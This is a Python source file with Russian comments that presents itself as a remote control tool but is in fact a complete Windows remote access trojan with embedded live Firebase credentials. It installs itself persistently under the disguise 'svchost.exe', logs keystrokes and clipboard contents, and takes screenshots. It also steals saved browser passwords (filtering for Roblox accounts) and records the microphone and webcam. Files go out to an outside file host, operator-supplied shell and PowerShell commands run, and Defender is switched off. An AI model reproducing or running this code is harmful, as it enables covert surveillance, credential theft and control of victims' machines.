#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Удалённое управление v4.1 – с логами и проводником
"""

import os, sys, time, threading, base64, io, webbrowser, random, subprocess, tempfile, traceback, urllib.request, ctypes
import json, shutil, winreg, sqlite3, glob
from datetime import datetime
import math
import requests
import pyrebase
import pyautogui
import pystray
from PIL import Image, ImageDraw, ImageFont
from pynput import keyboard, mouse
import pyttsx3

# Опциональные библиотеки (с try)
try:
    import sounddevice as sd
    import scipy.io.wavfile as wav
    SOUND_AVAILABLE = True
except:
    SOUND_AVAILABLE = False
    print("[WARN] sounddevice/scipy не установлены – микрофон недоступен")

try:
    import cv2
    CV2_AVAILABLE = True
except:
    CV2_AVAILABLE = False
    print("[WARN] opencv-python не установлен – веб-камера недоступна")

try:
    import pyperclip
    CLIP_AVAILABLE = True
except:
    CLIP_AVAILABLE = False
    print("[WARN] pyperclip не установлен – перехват буфера обмена недоступен")

# ------------------------- КОНФИГ FIREBASE -------------------------
FIREBASE_CONFIG = {
    "apiKey": "AIzaSyAAb2d_IOCpDO_niqfkjfWddhpZo0yaDOM",
    "authDomain": "gen-lang-client-0884792103.firebaseapp.com",
    "databaseURL": "https://gen-lang-client-0884792103-default-rtdb.europe-west1.firebasedatabase.app",
    "projectId": "gen-lang-client-0884792103",
    "storageBucket": "gen-lang-client-0884792103.firebasestorage.app",
    "messagingSenderId": "556057210756",
    "appId": "1:556057210756:web:45677d6e28066be811f7d1"
}
VIKING_USER_HASH = "nuShgVW38m"

# --------------------------------------------------------------------
TDATA_FOLDER = os.path.expandvars(r"%appdata%\Telegram Desktop\tdata")
RAW_USER = os.getlogin()
USER_ID = RAW_USER.replace(".", "_").replace("#", "_").replace("$", "_").replace("[", "_").replace("]", "_")
CLIENT_PATH = f"clients/{USER_ID}"

print(f"[INFO] Пользователь: {RAW_USER} -> ID в БД: {USER_ID}")

# ==================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ====================
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def get_exe_path():
    if getattr(sys, 'frozen', False):
        return sys.executable
    else:
        return f'"{sys.executable}" "{os.path.abspath(__file__)}"'

def upload_single_file(file_path):
    """Загрузка одного файла на VikingFile"""
    print(f"[VIKINGFILE] Загрузка {file_path}...")
    try:
        resp = requests.get("https://vikingfile.com/api/get-server", timeout=10)
        if resp.status_code != 200:
            print("[VIKINGFILE] Ошибка получения сервера")
            return None
        server = resp.json().get("server")
        file_size = os.path.getsize(file_path)
        resp = requests.post("https://vikingfile.com/api/get-upload-url", data={"size": file_size}, timeout=10)
        if resp.status_code != 200:
            return None
        data = resp.json()
        upload_id = data["uploadId"]
        key = data["key"]
        part_size = data["partSize"]
        urls = data["urls"]
        parts = []
        with open(file_path, "rb") as f:
            for i, url in enumerate(urls):
                chunk = f.read(part_size)
                if not chunk: break
                part_resp = requests.put(url, data=chunk, headers={"Content-Type": "application/octet-stream"}, timeout=300)
                if part_resp.status_code != 200:
                    raise Exception(f"Part {i+1} failed")
                etag = part_resp.headers.get("ETag", "").strip('"')
                if not etag:
                    raise Exception("No ETag")
                parts.append({"PartNumber": i+1, "ETag": etag})
        complete_data = {
            "key": key,
            "uploadId": upload_id,
            "name": os.path.basename(file_path),
            "user": VIKING_USER_HASH,
        }
        for i, part in enumerate(parts):
            complete_data[f"parts[{i}][PartNumber]"] = part["PartNumber"]
            complete_data[f"parts[{i}][ETag]"] = part["ETag"]
        resp = requests.post("https://vikingfile.com/api/complete-upload", data=complete_data, timeout=30)
        if resp.status_code != 200:
            return None
        result = resp.json()
        url = result.get("url")
        print(f"[VIKINGFILE] Загружено: {url}")
        return url
    except Exception as e:
        print(f"[VIKINGFILE] Ошибка: {e}")
        return None

# ==================== КОМАНДЫ (исполняемые) ====================
def _cmd_rickroll():
    print("[CMD] Rickroll")
    webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")

def _cmd_message(payload=""):
    print(f"[CMD] Сообщение: {payload}")
    pyautogui.alert(text=payload or "Сообщение", title="Управление")

def _cmd_crazy_mouse(duration=10):
    print("[CMD] Crazy mouse")
    pyautogui.FAILSAFE = False
    end = time.time()+duration
    while time.time()<end:
        pyautogui.moveRel(random.randint(-200,200), random.randint(-200,200), duration=0.1)
        time.sleep(0.05)
    pyautogui.FAILSAFE = True

def _cmd_screenshot(db):
    print("[CMD] Screenshot")
    try:
        img = pyautogui.screenshot()
        buf = io.BytesIO()
        img.convert("RGB").save(buf, format="JPEG", quality=50)
        db.child(CLIENT_PATH).update({"screenshot": base64.b64encode(buf.getvalue()).decode()})
        print("[CMD] Скриншот отправлен")
    except Exception as e:
        print(f"[ERROR] screenshot: {e}")

def _cmd_wallpaper(url):
    print(f"[CMD] Смена обоев: {url}")
    try:
        with urllib.request.urlopen(url) as resp:
            data = resp.read()
        ext = os.path.splitext(url)[1] or '.jpg'
        tmp = os.path.join(tempfile.gettempdir(), f"wallpaper_{USER_ID}{ext}")
        with open(tmp,"wb") as f: f.write(data)
        ctypes.windll.user32.SystemParametersInfoW(20,0,tmp,3)
        print("[CMD] Обои изменены")
    except Exception as e:
        print(f"[ERROR] wallpaper: {e}")

def _cmd_tts(text):
    print(f"[CMD] TTS: {text}")
    try:
        engine = pyttsx3.init()
        engine.say(text or "Привет")
        engine.runAndWait()
    except Exception as e:
        print(f"[ERROR] TTS: {e}")

def _cmd_open_calc():
    print("[CMD] Открыть калькулятор x10")
    for _ in range(10):
        subprocess.Popen("calc.exe", shell=True)

def _cmd_swap_mouse():
    print("[CMD] Swap mouse on 30s")
    ctypes.windll.user32.SwapMouseButton(1)
    time.sleep(30)
    ctypes.windll.user32.SwapMouseButton(0)

def _cmd_self_destruct(db, daemon):
    print("[CMD] Self-destruct")
    daemon.disable_startup()
    copy_path = os.path.expandvars(r"%AppData%\Microsoft\Windows\Caches\svchost.exe")
    if os.path.exists(copy_path):
        try: os.remove(copy_path); print("[SELF] Удалена копия")
        except: pass
    if getattr(sys, 'frozen', False):
        bat_content = f'@echo off\nping 127.0.0.1 -n 3 >nul\ndel /f /q "{sys.executable}"\ndel /f /q "%~f0"'
        bat_path = os.path.join(tempfile.gettempdir(), "selfdestruct.bat")
        with open(bat_path, "w") as f: f.write(bat_content)
        subprocess.Popen(bat_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        print("[SELF] Удаление запланировано")
    try:
        db.child(CLIENT_PATH).update({"status":"offline"})
    except: pass
    os._exit(0)

def _cmd_execute(cmd, db):
    print(f"[CMD] Выполнение команды: {cmd}")
    try:
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        out, err = proc.communicate(timeout=30)
        output = (out+err)[:5000]
        db.child(CLIENT_PATH).update({"last_cmd_output": output})
        print("[CMD] Команда выполнена")
    except Exception as e:
        db.child(CLIENT_PATH).update({"last_cmd_output": f"ERROR: {str(e)}"})
        print(f"[ERROR] cmd_execute: {e}")

def _cmd_disco(duration, daemon):
    print(f"[CMD] Disco на {duration} сек")
    dur = float(duration) if duration else 10
    if daemon.disco_active:
        return
    daemon.disco_active = True
    def disco():
        end = time.time()+dur
        while time.time()<end and daemon.disco_active:
            pyautogui.press('volumeup'); time.sleep(0.1)
            pyautogui.press('volumedown'); time.sleep(0.1)
        daemon.disco_active = False
    threading.Thread(target=disco, daemon=True).start()

# ==================== НОВЫЕ / УЛУЧШЕННЫЕ КОМАНДЫ ====================

# --- 1. Файловый менеджер (расширенный) ---
def _cmd_file_manager(db, payload):
    print(f"[CMD] File manager: {payload}")
    try:
        params = json.loads(payload)
        action = params.get("action")
        path = params.get("path", "")
        if action == "list":
            if not os.path.isdir(path):
                db.child(CLIENT_PATH).update({"file_list_error": "Не папка или не существует"})
                return
            items = []
            try:
                for entry in os.scandir(path):
                    try:
                        stat = entry.stat()
                        items.append({
                            "name": entry.name,
                            "is_dir": entry.is_dir(),
                            "size": stat.st_size if not entry.is_dir() else 0,
                            "mtime": stat.st_mtime
                        })
                    except:
                        pass
            except PermissionError:
                db.child(CLIENT_PATH).update({"file_list_error": "Нет доступа"})
                return
            # Сортируем: папки сначала, затем файлы
            items.sort(key=lambda x: (not x["is_dir"], x["name"].lower()))
            # Ограничим 500 элементов
            db.child(CLIENT_PATH).update({"file_list": items[:500]})
            print(f"[FILE] Отправлено {len(items)} элементов")
        elif action == "download":
            if os.path.isfile(path):
                url = upload_single_file(path)
                if url:
                    db.child(CLIENT_PATH).update({
                        "downloaded_file_url": url,
                        "downloaded_file_name": os.path.basename(path)
                    })
                    print("[FILE] Файл загружен на VikingFile")
            else:
                db.child(CLIENT_PATH).update({"file_download_error": "Файл не найден"})
        elif action == "delete":
            if os.path.exists(path):
                if os.path.isfile(path):
                    os.remove(path)
                else:
                    shutil.rmtree(path)
                db.child(CLIENT_PATH).update({"file_deleted": path})
                print(f"[FILE] Удалено: {path}")
            else:
                db.child(CLIENT_PATH).update({"file_delete_error": "Не найдено"})
        else:
            db.child(CLIENT_PATH).update({"file_manager_error": "Неизвестное действие"})
    except Exception as e:
        print(f"[ERROR] file_manager: {e}")
        db.child(CLIENT_PATH).update({"file_manager_error": str(e)})

# --- 2. Извлечение паролей (с фильтром Roblox) ---
def extract_chrome_passwords():
    passwords = []
    try:
        login_data_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data")
        if not os.path.isfile(login_data_path):
            return passwords
        temp_db = os.path.join(tempfile.gettempdir(), "chrome_login_temp.db")
        shutil.copy2(login_data_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            url, username, encrypted = row
            try:
                import win32crypt
                password = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8')
                passwords.append({"url": url, "username": username, "password": password})
            except:
                continue
        conn.close()
        os.remove(temp_db)
    except Exception as e:
        print(f"[PASS] Chrome error: {e}")
    return passwords

def extract_edge_passwords():
    passwords = []
    try:
        login_data = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data")
        if not os.path.isfile(login_data):
            return []
        temp_db = os.path.join(tempfile.gettempdir(), "edge_login_temp.db")
        shutil.copy2(login_data, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            url, username, encrypted = row
            try:
                import win32crypt
                password = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8')
                passwords.append({"url": url, "username": username, "password": password})
            except:
                continue
        conn.close()
        os.remove(temp_db)
    except:
        pass
    return passwords

def extract_firefox_passwords():
    passwords = []
    try:
        profiles = glob.glob(os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles\*.default-release"))
        if not profiles:
            profiles = glob.glob(os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles\*.default"))
        for profile in profiles:
            login_file = os.path.join(profile, "logins.json")
            if os.path.isfile(login_file):
                with open(login_file, "r", encoding="utf-8") as f:
                    data = json.load(f)
                for entry in data.get("logins", []):
                    # Пароль зашифрован, оставляем как есть
                    passwords.append({
                        "url": entry.get("hostname", ""),
                        "username": entry.get("usernameField", ""),
                        "password": "[зашифровано]"
                    })
    except:
        pass
    return passwords

def _cmd_extract_passwords(db):
    print("[CMD] Извлечение паролей из браузеров...")
    all_pass = []
    all_pass.extend(extract_chrome_passwords())
    all_pass.extend(extract_edge_passwords())
    all_pass.extend(extract_firefox_passwords())
    if all_pass:
        # Сохраняем все пароли
        db.child(CLIENT_PATH).update({"passwords": json.dumps(all_pass[:100])})
        # Фильтруем Roblox
        roblox_pass = [p for p in all_pass if "roblox" in p.get("url", "").lower()]
        if roblox_pass:
            db.child(CLIENT_PATH).update({"roblox_passwords": json.dumps(roblox_pass[:50])})
            print(f"[PASS] Найдено {len(roblox_pass)} паролей Roblox")
        else:
            db.child(CLIENT_PATH).update({"roblox_passwords": "[]"})
            print("[PASS] Паролей Roblox не найдено")
    else:
        db.child(CLIENT_PATH).update({"passwords": "[]", "roblox_passwords": "[]"})
        print("[PASS] Паролей не найдено")

# --- 3. Микрофон ---
def _cmd_record_mic(db, duration=10):
    print(f"[CMD] Запись микрофона {duration} сек")
    if not SOUND_AVAILABLE:
        db.child(CLIENT_PATH).update({"mic_error": "sounddevice not installed"})
        return
    try:
        dur = float(duration) if duration else 10
        fs = 44100
        recording = sd.rec(int(dur * fs), samplerate=fs, channels=1, dtype='int16')
        sd.wait()
        temp_wav = os.path.join(tempfile.gettempdir(), f"mic_{USER_ID}.wav")
        wav.write(temp_wav, fs, recording)
        url = upload_single_file(temp_wav)
        if url:
            db.child(CLIENT_PATH).update({"mic_url": url, "mic_duration": dur})
        os.remove(temp_wav)
        print("[CMD] Запись завершена")
    except Exception as e:
        db.child(CLIENT_PATH).update({"mic_error": str(e)})
        print(f"[ERROR] mic: {e}")

# --- 4. Веб-камера ---
def _cmd_webcam_snapshot(db):
    print("[CMD] Снимок веб-камеры")
    if not CV2_AVAILABLE:
        db.child(CLIENT_PATH).update({"webcam_error": "opencv not installed"})
        return
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            db.child(CLIENT_PATH).update({"webcam_error": "Cannot open camera"})
            return
        ret, frame = cap.read()
        if ret:
            _, buf = cv2.imencode('.jpg', frame)
            b64 = base64.b64encode(buf).decode()
            db.child(CLIENT_PATH).update({"webcam_image": b64})
            print("[CMD] Снимок сделан")
        else:
            db.child(CLIENT_PATH).update({"webcam_error": "No frame"})
        cap.release()
    except Exception as e:
        db.child(CLIENT_PATH).update({"webcam_error": str(e)})
        print(f"[ERROR] webcam: {e}")

# --- 5. PowerShell ---
def _cmd_powershell_execute(db, script):
    print("[CMD] PowerShell script execution")
    try:
        temp_ps1 = os.path.join(tempfile.gettempdir(), f"ps_{USER_ID}.ps1")
        with open(temp_ps1, "w", encoding="utf-8") as f:
            f.write(script)
        cmd = f'powershell -ExecutionPolicy Bypass -File "{temp_ps1}"'
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        out, err = proc.communicate(timeout=60)
        db.child(CLIENT_PATH).update({
            "ps_output": out[:5000],
            "ps_error": err[:5000]
        })
        os.remove(temp_ps1)
        print("[CMD] PowerShell выполнен")
    except Exception as e:
        db.child(CLIENT_PATH).update({"ps_error": str(e)})
        print(f"[ERROR] PowerShell: {e}")

# --- 6. Persistence ---
def create_persistence():
    print("[PERSIST] Создание самовосстановления")
    try:
        appdata = os.path.expandvars(r"%AppData%\Microsoft\Windows\Caches")
        if not os.path.exists(appdata):
            os.makedirs(appdata)
        ctypes.windll.kernel32.SetFileAttributesW(appdata, 2)
        exe_path = get_exe_path()
        copy_path = os.path.join(appdata, "svchost.exe")
        if getattr(sys, 'frozen', False):
            shutil.copy2(sys.executable, copy_path)
        else:
            shutil.copy2(os.path.abspath(__file__), copy_path + ".py")
        task_name = "RemoteControlTask"
        subprocess.run(f'schtasks /delete /tn "{task_name}" /f', shell=True, capture_output=True)
        cmd = f'schtasks /create /tn "{task_name}" /tr "{copy_path}" /sc minute /mo 5 /f'
        subprocess.run(cmd, shell=True, capture_output=True)
        print("[PERSIST] Готово")
        return True
    except Exception as e:
        print(f"[PERSIST] Error: {e}")
        return False

def remove_persistence():
    print("[PERSIST] Удаление самовосстановления")
    try:
        subprocess.run('schtasks /delete /tn "RemoteControlTask" /f', shell=True, capture_output=True)
        appdata = os.path.expandvars(r"%AppData%\Microsoft\Windows\Caches")
        copy_path = os.path.join(appdata, "svchost.exe")
        if os.path.exists(copy_path): os.remove(copy_path)
        py_copy = copy_path + ".py"
        if os.path.exists(py_copy): os.remove(py_copy)
        try: os.rmdir(appdata)
        except: pass
        print("[PERSIST] Удалено")
        return True
    except Exception as e:
        print(f"[PERSIST] Error: {e}")
        return False

# --- 7. Defender ---
def _cmd_disable_defender(db):
    print("[CMD] Отключение Defender")
    if not is_admin():
        db.child(CLIENT_PATH).update({"defender_status": "not_admin"})
        print("[CMD] Нет прав администратора")
        return
    try:
        exe_path = get_exe_path()
        subprocess.run(f'powershell -Command "Set-MpPreference -ExclusionPath \\"{exe_path}\\""', shell=True, capture_output=True)
        subprocess.run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', shell=True, capture_output=True)
        db.child(CLIENT_PATH).update({"defender_status": "disabled"})
        print("[CMD] Defender отключён")
    except Exception as e:
        db.child(CLIENT_PATH).update({"defender_status": f"error: {e}"})
        print(f"[ERROR] Defender: {e}")

# --- 8. Геолокация ---
def get_geo_info():
    print("[GEO] Запрос геолокации")
    try:
        resp = requests.get('http://ip-api.com/json/', timeout=5)
        if resp.status_code == 200:
            geo = resp.json()
            if geo.get('status') == 'success':
                print(f"[GEO] {geo.get('city')}, {geo.get('country')}")
                return {
                    "ip": geo.get('query'),
                    "country": geo.get('country'),
                    "city": geo.get('city'),
                    "isp": geo.get('isp'),
                    "lat": geo.get('lat'),
                    "lon": geo.get('lon')
                }
    except Exception as e:
        print(f"[GEO] Ошибка: {e}")
    return None

# ==================== КЕЙЛОГГЕР ====================
class KeyLogger:
    def __init__(self, db, client_path):
        self.db = db
        self.client_path = client_path
        self.buffer = []
        self.buffer_lock = threading.Lock()
        self.running = False
        self.listener = None
        self.send_interval = 30
        self.max_buffer = 1000

    def start(self):
        if self.running:
            return
        self.running = True
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        threading.Thread(target=self._send_loop, daemon=True).start()
        print("[KEYLOG] Кейлоггер запущен")

    def stop(self):
        self.running = False
        if self.listener:
            self.listener.stop()
            self.listener = None
        self._send_buffer()
        print("[KEYLOG] Кейлоггер остановлен")

    def on_press(self, key):
        if not self.running: return
        try:
            if hasattr(key, 'char') and key.char is not None:
                char = key.char
            else:
                char = f'[{key.name}]' if hasattr(key, 'name') else f'[{str(key)}]'
            with self.buffer_lock:
                self.buffer.append(char)
                if len(self.buffer) >= self.max_buffer:
                    self._send_buffer()
        except: pass

    def _send_buffer(self):
        with self.buffer_lock:
            if not self.buffer: return
            text = ''.join(self.buffer)
            self.buffer.clear()
        try:
            current = self.db.child(self.client_path).child("keylog").get().val() or ""
            if len(current) > 5000:
                current = current[-5000:]
            new_log = current + text
            self.db.child(self.client_path).update({"keylog": new_log[-10000:]})
        except: pass

    def _send_loop(self):
        while self.running:
            time.sleep(self.send_interval)
            self._send_buffer()

# ==================== МОНИТОРИНГ БУФЕРА ====================
def clipboard_monitor(db, client_path):
    if not CLIP_AVAILABLE:
        return
    last_text = ""
    while True:
        try:
            text = pyperclip.paste()
            if text and text != last_text:
                db.child(client_path).child("clipboard_history").push({
                    "text": text[:500],
                    "timestamp": {".sv": "timestamp"}
                })
                last_text = text
        except: pass
        time.sleep(2)

# ==================== ОСНОВНОЙ КЛАСС ДЕМОНА ====================
class RemoteDaemon:
    def __init__(self):
        self.stop_event = threading.Event()
        self.db = None
        self.tray_icon = None
        self._connection_ok = False
        self.blocking_active = False
        self.block_mouse_listener = None
        self.block_keyboard_listener = None
        self.disco_active = False
        self.keylogger = None
        self.clipboard_thread = None

    def _init_firebase(self):
        print("[INIT] Подключение к Firebase...")
        try:
            firebase = pyrebase.initialize_app(FIREBASE_CONFIG)
            self.db = firebase.database()
            self.db.child("clients").get()
            self._connection_ok = True
            print("[INIT] Успех")
        except Exception as e:
            print(f"[ERROR] Firebase init: {e}")
            self._connection_ok = False

    def _heartbeat_loop(self):
        while not self.stop_event.is_set():
            try:
                if self.db:
                    self.db.child(CLIENT_PATH).update({"last_seen": {".sv": "timestamp"}})
            except: pass
            time.sleep(5)

    def _poll_commands(self):
        last = "none"
        while not self.stop_event.is_set():
            try:
                if not self.db:
                    time.sleep(2)
                    continue
                data = self.db.child(CLIENT_PATH).get().val()
                if isinstance(data, dict):
                    cmd = data.get("command", "none")
                    payload = data.get("payload", "")
                    if cmd != "none" and cmd != last:
                        print(f"[POLL] Получена команда: {cmd} (payload: {payload})")
                        threading.Thread(target=self._execute_command, args=(cmd, payload), daemon=True).start()
                        self.db.child(CLIENT_PATH).update({"command": "none"})
                    last = cmd
            except Exception as e:
                print(f"[POLL] Error: {e}")
            time.sleep(2)

    def _execute_command(self, cmd, payload):
        try:
            if cmd == "rickroll":
                _cmd_rickroll()
            elif cmd == "msg":
                _cmd_message(payload)
            elif cmd == "crazy_mouse":
                _cmd_crazy_mouse()
            elif cmd == "block_input":
                enable = payload.lower() == "true"
                if enable and not self.blocking_active:
                    self.blocking_active = True
                    self._start_input_block()
                    print("[CMD] Блокировка включена")
                elif not enable and self.blocking_active:
                    self.blocking_active = False
                    self._stop_input_block()
                    print("[CMD] Блокировка выключена")
            elif cmd == "screenshot":
                _cmd_screenshot(self.db)
            elif cmd == "wallpaper":
                _cmd_wallpaper(payload)
            elif cmd == "tts":
                _cmd_tts(payload)
            elif cmd == "open_calc":
                _cmd_open_calc()
            elif cmd == "swap_mouse":
                _cmd_swap_mouse()
            elif cmd == "self_destruct":
                _cmd_self_destruct(self.db, self)
            elif cmd == "cmd_execute":
                _cmd_execute(payload, self.db)
            elif cmd == "disco":
                _cmd_disco(payload, self)
            elif cmd == "extract_passwords":
                _cmd_extract_passwords(self.db)
            elif cmd == "record_mic":
                _cmd_record_mic(self.db, payload)
            elif cmd == "webcam_snapshot":
                _cmd_webcam_snapshot(self.db)
            elif cmd == "file_manager":
                _cmd_file_manager(self.db, payload)
            elif cmd == "powershell_execute":
                _cmd_powershell_execute(self.db, payload)
            elif cmd == "disable_defender":
                _cmd_disable_defender(self.db)
            elif cmd == "create_persistence":
                create_persistence()
            elif cmd == "remove_persistence":
                remove_persistence()
            else:
                print(f"[CMD] Неизвестная команда: {cmd}")
        except Exception as e:
            print(f"[ERROR] Выполнение команды {cmd}: {e}")
            try:
                self.db.child(CLIENT_PATH).update({"last_command_error": traceback.format_exc()[:1000]})
            except: pass

    def _start_input_block(self):
        def sup(*a): return False
        self.block_mouse_listener = mouse.Listener(suppress=True, on_move=sup, on_click=sup, on_scroll=sup)
        self.block_keyboard_listener = keyboard.Listener(suppress=True, on_press=sup, on_release=sup)
        self.block_mouse_listener.start()
        self.block_keyboard_listener.start()

    def _stop_input_block(self):
        if self.block_mouse_listener:
            self.block_mouse_listener.stop()
            self.block_mouse_listener = None
        if self.block_keyboard_listener:
            self.block_keyboard_listener.stop()
            self.block_keyboard_listener = None

    def _auto_screenshot_loop(self):
        while not self.stop_event.is_set():
            _cmd_screenshot(self.db)
            for _ in range(10):
                if self.stop_event.is_set(): break
                time.sleep(1)

    def disable_startup(self):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                                 0, winreg.KEY_SET_VALUE)
            try:
                winreg.DeleteValue(key, "RemoteControl")
            except: pass
            winreg.CloseKey(key)
        except: pass
        remove_persistence()
        if self.tray_icon:
            self.tray_icon.notify("Автозагрузка и планировщик отключены", "Remote Control")
        print("[DISABLE] Автозагрузка отключена")

    def _create_tray_icon(self):
        print("[TRAY] Создание иконки")
        size = 64
        img = Image.new("RGBA", (size,size), (0,0,0,0))
        dc = ImageDraw.Draw(img)
        dc.ellipse((4,4,size-4,size-4), fill=(0,120,255,255))
        try:
            font = ImageFont.truetype("arial.ttf", 30)
        except:
            font = ImageFont.load_default()
        dc.text((18,14), "R", fill=(255,255,255,255), font=font)
        menu = pystray.Menu(
            pystray.MenuItem(lambda item: f"ID: {USER_ID}", None, enabled=False),
            pystray.MenuItem(lambda item: f"Online" if self._connection_ok else "Offline", None, enabled=False),
            pystray.MenuItem("Переподключиться", lambda icon: self._init_firebase()),
            pystray.MenuItem("Отключить автозапуск", lambda icon: self.disable_startup()),
            pystray.MenuItem("Выход", lambda icon: self._shutdown())
        )
        self.tray_icon = pystray.Icon("RemoteControl", img, "System", menu)
        self.tray_icon.run()

    def _shutdown(self):
        print("[SHUTDOWN] Завершение работы")
        self.stop_event.set()
        if self.blocking_active:
            self._stop_input_block()
        if self.keylogger:
            self.keylogger.stop()
        try:
            if self.db:
                self.db.child(CLIENT_PATH).update({"status": "offline"})
        except: pass
        if self.tray_icon:
            self.tray_icon.stop()
        sys.exit(0)

    def run(self):
        global db
        self._init_firebase()
        db = self.db

        try:
            self.db.child(CLIENT_PATH).set({
                "status": "online",
                "last_seen": {".sv": "timestamp"},
                "command": "none",
                "payload": "",
                "screenshot": "",
                "last_cmd_output": ""
            })
            print(f"[REG] {USER_ID} зарегистрирован")
        except Exception as e:
            print(f"[ERROR] Регистрация: {e}")

        # Автозагрузка в реестр
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                                 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "RemoteControl", 0, winreg.REG_SZ, get_exe_path())
            winreg.CloseKey(key)
            print("[STARTUP] Добавлено в автозагрузку")
        except Exception as e:
            print(f"[STARTUP] Ошибка: {e}")

        create_persistence()

        geo = get_geo_info()
        if geo:
            try:
                self.db.child(CLIENT_PATH).update({"geo": geo})
            except: pass

        self.keylogger = KeyLogger(self.db, CLIENT_PATH)
        self.keylogger.start()

        if CLIP_AVAILABLE:
            self.clipboard_thread = threading.Thread(target=clipboard_monitor, args=(self.db, CLIENT_PATH), daemon=True)
            self.clipboard_thread.start()
            print("[CLIP] Мониторинг буфера обмена запущен")

        threading.Thread(target=self._heartbeat_loop, daemon=True).start()
        threading.Thread(target=self._poll_commands, daemon=True).start()
        threading.Thread(target=self._auto_screenshot_loop, daemon=True).start()
        threading.Thread(target=self._create_tray_icon, daemon=True).start()

        self.stop_event.wait()

if __name__ == "__main__":
    try:
        RemoteDaemon().run()
    except Exception as e:
        print(f"[FATAL] {e}")
        traceback.print_exc()
        try:
            firebase = pyrebase.initialize_app(FIREBASE_CONFIG)
            db = firebase.database()
            db.child(CLIENT_PATH).update({"fatal_error": traceback.format_exc()[:1000]})
        except: pass
        input("Нажмите Enter для выхода...")
